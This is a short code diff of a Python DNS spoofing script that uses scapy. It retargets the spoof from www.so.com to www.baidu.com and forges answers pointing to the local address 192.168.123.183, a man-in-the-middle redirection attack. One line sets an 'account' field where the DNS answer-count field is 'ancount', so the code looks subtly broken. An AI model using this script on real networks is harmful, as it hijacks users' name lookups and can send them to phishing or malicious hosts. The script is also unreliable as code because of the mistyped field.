@@ -7,9 +7,9 @@ def process_packet(packet):
      #   packet.accept()
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if b"www.so.com" in qname:
+        if b"www.baidu.com" in qname:
             print("[+] Spoofing Target")
-            answer = scapy.DNSRR(rrname=qname, rdata="14.215.177.38")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.123.183")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].account = 1
             #scapy会自动计算矫验，加入answer
@@ -19,7 +19,6 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].len
             
             packet.set_payload(scapy.raw(scapy_packet))
-
     packet.accept()
     #else:
         #packet.accept()
